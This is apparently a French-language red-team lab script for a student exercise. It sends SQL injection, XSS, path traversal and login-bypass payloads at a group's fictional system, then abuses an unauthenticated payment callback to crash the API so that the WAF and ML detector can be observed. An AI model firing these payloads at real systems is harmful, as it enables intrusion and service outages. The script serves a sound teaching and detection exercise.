"""Scénario d'attaque Red Team — LABORATOIRE UNIQUEMENT.

À exécuter depuis le PC Attaquant, contre le SI fictif de VOTRE groupe
exclusivement (sujet §3.4 et §9). Ne jamais viser le réseau du campus, un autre
groupe ou un service tiers.

Deux étapes, qui produisent un effet observable par la supervision :
  1. un scan de payloads malveillants -> bloqués par le WAF (403), visibles
     dans les logs (feature waf_blocks) et dans le taux d'erreurs 4xx ;
  2. l'abus du callback de paiement non authentifié -> met l'API hors service
     (erreurs 5xx), ce que le détecteur ML doit repérer.

Usage :
    python attack.py --target http://192.168.137.1:8080
"""
import argparse

import httpx

SCAN_PAYLOADS = [
    "/products?id=1 UNION SELECT password FROM users",
    "/search?q=<script>alert(1)</script>",
    "/files?path=../../etc/passwd",
    "/login?user=admin' OR 1=1--",
]


def scan(client: httpx.Client, target: str):
    print("== Étape 1 : scan de payloads (le WAF doit répondre 403) ==")
    for path in SCAN_PAYLOADS:
        code = client.get(target + path).status_code
        print(f"  {code}  {path}")


def exploit(client: httpx.Client, target: str):
    print("== Étape 2 : abus du callback de paiement (met l'API hors service) ==")
    response = client.post(f"{target}/pay/callback", json={"status": "__CRASH__"})
    print(f"  callback -> {response.status_code}")
    code = client.get(f"{target}/healthz").status_code
    print(f"  healthz après exploitation -> {code} (503/500 attendu : service dégradé)")


def main():
    parser = argparse.ArgumentParser(description="Attaque de laboratoire contre le SI fictif du groupe")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="URL du WAF du groupe")
    args = parser.parse_args()

    print(f"Cible : {args.target}  (doit être le SI fictif de votre groupe)\n")
    with httpx.Client(timeout=5) as client:
        scan(client, args.target)
        exploit(client, args.target)
    print("\nL'incident est en cours. Observez la détection et la reprise automatique.")


if __name__ == "__main__":
    main()
